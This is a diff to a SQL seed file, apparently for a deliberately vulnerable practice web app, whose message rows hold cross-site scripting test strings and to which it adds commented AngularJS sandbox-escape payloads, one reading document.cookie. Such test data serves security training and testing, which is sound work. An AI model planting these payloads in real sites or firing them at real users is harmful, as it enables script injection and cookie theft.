@@ -13,3 +13,9 @@ insert into message(id,created,to_id,from_id,summary,text) values (112,'2014-07-
 insert into message(id,created,to_id,from_id,summary,text) values (120,'2014-07-12 10:00:00',2,2,'Hello Self','Ready to Hack!');
 insert into message(id,created,to_id,from_id,summary,text) values (121,'2014-07-12 10:00:00',0,2,'XSS in Script','<script>alert(''xss'');</script>');
 insert into message(id,created,to_id,from_id,summary,text) values (122,'2014-07-12 10:00:00',0,2,'XSS in HTML',''');document.write(''thank you come again'');//');
+
+-- XSS Test with Angular
+-- {{ 'a'.constructor.prototype.charAt=[].join; $eval("x=alert('Got you!')") }}
+-- {{ 'a'.constructor.prototype.charAt=[].join; $eval("x=alert(document.cookie)") }}
+
+
